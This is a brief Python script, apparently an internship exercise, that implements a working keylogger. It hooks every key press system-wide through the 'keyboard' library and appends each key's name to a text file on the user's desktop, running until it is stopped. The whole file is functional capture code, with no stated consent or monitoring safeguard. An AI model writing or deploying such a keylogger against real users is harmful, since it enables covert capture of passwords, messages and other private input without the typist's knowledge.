import keyboard

log_file_path = r"C:\Users\avvar\OneDrive\Desktop\Tamizan intern\keystrokes.txt"  # Using raw string to handle backslashes

def on_key_press(event):
    with open(log_file_path, 'a') as f:  # Corrected variable name
        f.write('{}\n'.format(event.name))
keyboard.on_press(on_key_press)  # Place listener outside the function
keyboard.wait()


